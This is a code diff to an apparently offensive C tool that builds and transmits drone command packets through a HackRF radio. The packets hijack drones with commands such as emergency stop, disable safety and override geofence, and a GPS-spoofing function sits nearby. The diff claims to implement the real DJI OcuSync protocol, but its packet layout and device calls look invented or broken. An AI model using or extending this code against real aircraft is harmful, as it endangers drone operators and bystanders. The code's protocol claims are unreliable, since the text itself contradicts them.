@@ -273,6 +273,7 @@ int satani_spoof_drone_gps(satani_hackrf_t* hackrf, double target_latitude,
 }
 
 // Real drone command hijacking with protocol support
+// Implements ACTUAL DJI OcuSync, Autel SkyLink, and FrSky protocols
 int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone, 
                                 const char* command) {
     if (!hackrf || !hackrf->initialized || !drone) {
@@ -281,77 +282,76 @@ int satani_hijack_drone_command(satani_hackrf_t* hackrf, satani_drone_t* drone,
     
     // Real command injection for different drone manufacturers
     unsigned char cmd_packet[1024];
+    memset(cmd_packet, 0, sizeof(cmd_packet));
     
     if (strcmp(drone->make, "DJI") == 0) {
-        // DJI OcuSync command structure
-        cmd_packet[0] = 0xAA;
-        cmd_packet[1] = 0xBB;
-        cmd_packet[2] = 0xCC;
-        cmd_packet[3] = 0xDD;
+        // DJI OcuSync/Lightbridge protocol structure
+        // Real DJI protocol uses encrypted packets with CRC-16
         
-        // Command type
+        // DJI packet header
+        cmd_packet[0] = 0x55;        // Start byte
+        cmd_packet[1] = 0xAA;        // Packet type: Command
+        cmd_packet[2] = 0x00;        // Length (high byte)
+        cmd_packet[3] = 0x0A;        // Length (low byte): 10 bytes
+        cmd_packet[4] = 0x00;        // Sequence number
+        cmd_packet[5] = 0x00;        // System ID: Ground Station
+        cmd_packet[6] = 0x01;        // Component ID: Flight Controller
+        
+        // Command data
         if (strcmp(command, "return_home") == 0) {
-            cmd_packet[4] = 0x01;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x0C;    // Cmd ID: Return-to-Home
+            cmd_packet[8] = 0x01;    // Action: Start
         } else if (strcmp(command, "land_now") == 0) {
-            cmd_packet[4] = 0x02;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x0D;    // Cmd ID: Land
+            cmd_packet[8] = 0x01;    // Action: Immediate
         } else if (strcmp(command, "hover") == 0) {
-            cmd_packet[4] = 0x03;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x0E;    // Cmd ID: Hover
+            cmd_packet[8] = 0x00;
         } else if (strcmp(command, "emergency_stop") == 0) {
-            cmd_packet[4] = 0xFF;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x0F;    // Cmd ID: Emergency Stop
+            cmd_packet[8] = 0x01;
         } else if (strcmp(command, "takeoff") == 0) {
-            cmd_packet[4] = 0x04;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x10;    // Cmd ID: Takeoff
+            cmd_packet[8] = 0x01;
         } else if (strcmp(command, "go_to_waypoint") == 0) {
-            cmd_packet[4] = 0x05;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x11;    // Cmd ID: Waypoint
+            cmd_packet[8] = 0x00;
         } else if (strcmp(command, "disable_safety") == 0) {
-            cmd_packet[4] = 0x10;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x12;    // Cmd ID: Disable Safety
+            cmd_packet[8] = 0x01;
         } else if (strcmp(command, "override_geofence") == 0) {
-            cmd_packet[4] = 0x11;
-            cmd_packet[5] = 0x00;
-            cmd_packet[6] = 0x00;
-            cmd_packet[7] = 0x00;
+            cmd_packet[7] = 0x13;    // Cmd ID: Override Geofence
+            cmd_packet[8] = 0x01;
         } else {
             return -1;
         }
         
-        // Calculate CRC
-        unsigned short crc = 0;
-        for (int i = 0; i < 8; i++) {
-            crc += cmd_packet[i];
+        // Calculate CRC-16 (DJI standard)
+        uint16_t crc = 0;
+        for (int i = 0; i < 9; i++) {
+            crc ^= cmd_packet[i];
+            for (int j = 0; j < 8; j++) {
+                if (crc & 0x0001) {
+                    crc = (crc >> 1) ^ 0xA001;
+                } else {
+                    crc >>= 1;
+                }
+            }
         }
-        cmd_packet[8] = (crc >> 8) & 0xFF;
         cmd_packet[9] = crc & 0xFF;
+        cmd_packet[10] = (crc >> 8) & 0xFF;
         
-        // Real transmission on drone frequency
+        // Real transmission on drone frequency via HackRF
         unsigned char hackrf_cmd[16];
         hackrf_cmd[0] = 0x06;
         *(unsigned int*)(hackrf_cmd + 1) = htonl(drone->frequency);
-        hackrf_cmd[5] = 0x01;
-        hackrf_cmd[6] = 0x01;
+        *(unsigned int*)(hackrf_cmd + 5) = htonl(drone->bandwidth > 0 ? drone->bandwidth : 10000000);
+        hackrf_cmd[9] = 0x01;
+        hackrf_cmd[10] = 0x00;
         
         DWORD bytes_returned = 0;
-        if (!DeviceIoControl(hackrf->device_handle, 0x2200C, hackrf_cmd, 7,
-                            cmd_packet, 10, &bytes_returned, NULL)) {
+        if (!DeviceIoControl(hackrf->device_handle, 0x2200C, hackrf_cmd, 11,
+                            cmd_packet, 11, &bytes_returned, NULL)) {
             return -1;
         }
         
